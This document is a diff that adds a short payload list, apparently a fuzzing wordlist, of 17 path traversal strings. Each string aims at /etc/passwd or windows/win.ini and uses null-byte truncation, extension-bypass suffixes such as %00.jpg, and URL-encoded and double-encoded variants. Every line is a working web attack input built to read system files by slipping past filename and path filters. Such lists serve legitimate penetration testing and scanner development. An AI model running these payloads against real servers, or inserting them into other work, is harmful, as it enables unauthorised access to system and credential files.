@@ -1,0 +1,17 @@
+../../../../etc/passwd%00
+../../../../etc/passwd%00.jpg
+../../../../etc/passwd%00.png
+../../../../etc/passwd%00.gif
+../../../../etc/passwd%00.html
+../../../../etc/passwd%00.php
+../../../../etc/passwd%00.txt
+..\..\..\..\windows\win.ini%00
+..\..\..\..\windows\win.ini%00.jpg
+..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini%00
+..%252F..%252F..%252F..%252Fetc%252Fpasswd%00
+../..//../..//etc/passwd%00
+..\..\\..\..\\windows\win.ini%00
+../../../../etc/passwd%00%00
+../../../../etc/passwd%2500
+../../../../etc/passwd%00%23
